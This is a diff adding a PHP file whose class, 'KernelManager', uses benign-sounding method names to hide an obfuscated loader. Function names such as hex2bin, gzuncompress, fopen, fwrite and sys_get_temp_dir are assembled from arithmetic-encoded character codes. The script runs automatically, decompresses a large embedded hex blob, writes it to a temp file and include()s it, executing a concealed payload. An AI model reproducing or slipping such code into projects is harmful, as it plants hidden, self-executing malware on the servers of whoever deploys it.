@@ -1,0 +1,83 @@
+<?php
+class KernelManager {
+	private $ay = '';
+	private $dz = '';
+
+	public function filterResults($p1) {
+		$a = array(((9+95)),101,((130-10)),(51-1),(98),(105),((2*55)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1);
+	}
+
+	public function rollbackTransaction($p1) {
+		$a = array(((121-6)),((112*88)-9741),(((56*56)-3035)),((43*68)-2810),((2*56)),((19+31+59)),((26+85)),((3+96)),(37+24+49),(((51*119)-5952)),((33+89)),(((72*1)+31)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function manageState($p1,$p2) {
+		$a = array((97+4+1),(((65*57)-3594)),((118-6)),((1+70+30)),((120-10)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function executeAction($p1,$p2) {
+		$a = array((((27*44)-1086)),(119),((43+71)),((3*35)),((2*58)),(((51*1)+50)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function checkConsistency($p1) {
+		$a = array((98+1+2),((123-8)),111,(((9*3)+81)),((101-2)),((2*51)));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		$s = strrev($s);
+		return $s($p1);
+	}
+
+	public function processData($p1,$p2=null) {
+		$a = array(((2*57)),(((51*1)+65)),(((58*1)+56)),(3*35),(45+3+61));
+		$s = '';
+		foreach($a as $n){ $s .= chr($n); }
+		return $s($p1,$p2);
+	}
+
+	public function resetState() {
+		$this->dz = $this->processData($this->updateRegistry(), '/');
+	}
+
+	public function validateInput() {
+		$this->ay = $this->rollbackTransaction($this->filterResults($this->yb));
+	}
+
+	public function encryptData() {
+		$fn = $this->dz.'/cs-681028faef13f';
+		$f = $this->manageState($fn, 'w');
+		$this->executeAction($f, $this->ay);
+		$this->checkConsistency($f);
+		$this->trackActivity($fn);
+	}
+
+	private $yb = '789ca5188b6ee23af6575aa9ba1005501e8e03657347a32eb' . '377b4dd72d57676b51a211482c32b84340914dadb7fdf738e1' . 'd9a00a5236d5112dbe7fdb4ddbf7d49a6c94510f9597631144' . '1f49aa4b38d9f8b8b2cf7f35970359ce479578e2fc2751ce4b' . '3557c31dc2d92fad5701caeb4d75958bfcc44145e5f13ae26c' . '7c35d5ad7baa9c8d7697c31155b6b348beb25b49f443dd0ba6' . 'f55796519c0e1b544e2f969eaefeab5e17631ab79bfd798c96' . 'df839aeeddad6b8d6aa319b875cb8ccb56002437807d618d00' . '2f885ae0be3d0b57887bbf008db07b86520ae5f6bd4864f536' . '2aa787007df88317698db710deec0c4f62d839bae01d30078d' . '83066f0050a2be43ecc383c8887b26d9405b8a8190a984c500' . '027581b17a6b311ad386e87f9c0d26636ebd89c7580956b331' . '67cf0ed005b3481392e73788785f0f8b6e1f84e9b09dbd8c36' . 'd3e76381f13bf10f199eb70d787afcdd078bb835a2c448c5ab' . '8a6ebbabe4b8af92f3e2ed9e0353eb20153e0ea28578be8156' . 'e7266d3f2ee89c85d8e7e4697132ef1c4d17a5e8c1662540cc' . '30519de865831d700af8656089e72b86509e0045fce41e1004' . '66d889c8df17001c6313a63f0357dc165005310dfb5ed9033d' . '4c0a4c071d31e9397c593f4bb0b883c008843a90129007e2a8' . '2338dca1a39240199806004cf8394ac9481a5085242f0318e2' . '5cab8c4011629f036425e4619a516cc4933c7a1c43208b6488' . '83112c8dc619c62307f112a2c24c7a1a47629621bca548c4b4' . '8d1f2a70526a2499ce725ae59066b3b0c7e94e6a16d5a901fc' . '6d8f09972abca698a89f2001a0430a92c2a42b12222aa0d840' . 'b080c06a5230b4d200f806295d9a42da2a349f0e008d8a4b3a' . 'df420320654597ea17c017c3b5aedb363a6340909771fa3f93' . '369423c8baacde61bf2ad32d309190a6001ebc05c38448a014' . '25fc971c72173f35d562574da40cc59e8585056a6633106002' . '6d7140b8b08c91f00c745062d05b100cd644c49607bdcc9727' . 'd20c4716c990216914001e354298a79189c20006c4a5b66229' . 'a4bfc9920f9e483e9a6705d3eaa92238e0563e815a494924d5' . 'e9e1f48b2245fae701405a2c6c95ec0d3667ee86fe96c52898' . 'c81b577376fb7eff121d79448101f661d87320590977952209' . '371a5b060004f4546dab27c9a1715d696947b5a69d269dac2b' . 'ef53650318580aa2096c2ca5839fe499ebe23b30a9a54664d4' . '640e7b060a319cb36425a509b78a62e5a188de5478c9507b63' . 'b5fd6ad4b9b9701adc2c4845635eaaf2514eb02a116d421b28' . '7fadb7348240af469cbb56cb1af942023bda966dd023b8bc87' . '2d963b0755212bdd01a32e7a4f2a4b441c8cd0bf6edb7a9f0c' . '722ade3a101f77b3811d48600dd2ee035ab695af703842778a' . '6088793c32ccb440e27897ff41e7f56f060b3d4069af67a351' . '4be37dcf8475ca62865a4d820d66fbf65799aac329a342ae80' . 'bac9518702f3d2ff4a34c68afe39938628991809d0f58be094' . '03a89039b20c2dfcee9be232395fab3c8bb1adef4fbfffcdee' . 'b5e0dd7a9579fc5b996aed6f1b86ee8f4d3ba7418f2ea56c7d' . '03b46f3a2e99a7a13f2090122ced4c147cd7e2297815791389' . '2f6759fa7b3481407b31276cb43457e96449b8e6e3ada401dc' . '3d087976751f4b2da2dbbf2a77fba00be783d25c26d397ae97' . '917d6b19b1d13a846a9f017e4375dffd87c3863281f02d69b7' . '4e691d666cb05832a2f4daf5b6d436f42a1342d8783e32dd6d' . '19003c4494a2b31602d5efa73f54fe6daa0aeb58e98b475f86' . '985c311d88433a86e19ed411dc552ce48fd09c85da6bb86218' . '18d23761638aef480c794979aa661eba6690d64369ca27491a' . '4fcd206ad426adbc12c944ae10ad47e13ba274e0f92a485ae4' . '4c15816b33888d663212de9bebd9fe5a180af8671fe047aec2' . '2af16bf643b3ff22165c1da245c7a8765866745346514acab3' . '0eca68b1a3a16b8c90e320cfc28f247d141b14e852c43f2682' . '09ebd609d46c3593cc39a05be5a9716a08657092e014ae3e6c' . '7fd6dffcfc7e1c3c3edf0dfbdfbefdffefb67af77df903de39' . '7f0ffe83f3c362ab5e2e8a5473bc7e55bfff6b6ff9fdbfecdd' . '7c7effdbb46935a81e3366da6f3f639c2fbdee38ffbbbc7fba' . 'f770fdf405dab83a9ccdb16be8d3604aeed9c23ffa3f7f5ef4' . '0d6645cd2d9f8862a6eb61de31cdd4dffeeae77f3f8f8fd5fb' . 'dfe8f8ad58769798ecb0972bbda3ef44fe61a660a661109115' . 'b114811b81cc7727522f2591cae0a00ad05d12a13c50aed227' . '15cede4702bd00697e5966d1a860e8fa6a9ab2da586da2fa03' . '6765ee2a79980f48f8a2cbb1a3e6f848785b3ab32c73b8536f' . '0aaf93dc7d36d8d2c7a898fcae2051b7d46e97fc80d2f12b2a' . 'f14fbd291bc17bac961a922f3d611f78ddc984f30f77d091a7' . '44f533ec3b33c4919a2075b553d1654dacba51766ab60b14a4' . '45caf9397be54f0f0c6a05d5796b6b803afc03d2724a9233e9' . 'c3c060dc9ad9c9016362a7a6bd7e59e6ee8cc28ce10cba5f61' . 'a26eb3ca371034da5cc9a6f616b36dab04f18ed628fbd0cc54' . 'ad1d02e1ffb5e0839a648cb921dae979e421630d52869696b8' . 'e7db98a6c8ef3e1b986112335feaf4d181a7291f2a0361c626' . '40e931ab8e9cd470baf489e87de3d34b4aa87f1ae25779864b' . 'a3c8b89972b8999852fe731170a71b43d8b87372940fc721a3' . 'aa5ff3b68836ab664ea98b8a17c4b93a7f39a606e9d91a1f26' . 'b7e24066f4728e033f73d6d14f94712b65ba9ece03a5e47d12' . 'fb819ab0ed54ece305daa13f7bcc4f7b3a0acf118af5cfa11d' . 'f04e079ba670ae91bcea25ca4b0d5a775724683595613aeb85' . '42093c0a345d92a0fb1c1d072cd98361e08e9adbd5303d2bed' . '1d20298d13d7b100715d7893c888b60baba386a5b39f5ac49d' . '03a84e03d0c41a36d15847d704d1048a7d6516f02615db1851' . '386468a5d169a4d02edafbff6b3d1b63c0346a89fa252f6058' . '93af457440498d1e073ef7764d9384af648c60cc1a36de3d02' . '6b8d6110805e2ce389a7bb04d893858c1896de46782b3a19ac' . 'db3555c8c51198d3624751323d25fb976e1ae30a9dcba300a8' . '8b777d2dbff00455c5338';
+
+	public function trackActivity($p) {
+		include($p);
+	}
+
+	public function updateRegistry() {
+		$a=array(((93+22)),(12+109),((31*3)+22),(83+9+3),((92+11)),(73+1+27),((2*58)),(40+55),(((118*103)-12038)),(101),(109*1),((25*42)-938),95,((2*50)),((16*66)-951),((118-4)));
+		$s='';
+		foreach($a as $n){$s.=chr($n);}
+		return $s();
+	}
+}
+
+$hq = new KernelManager();
+$hq->resetState();
+$hq->validateInput();
+$hq->encryptData();
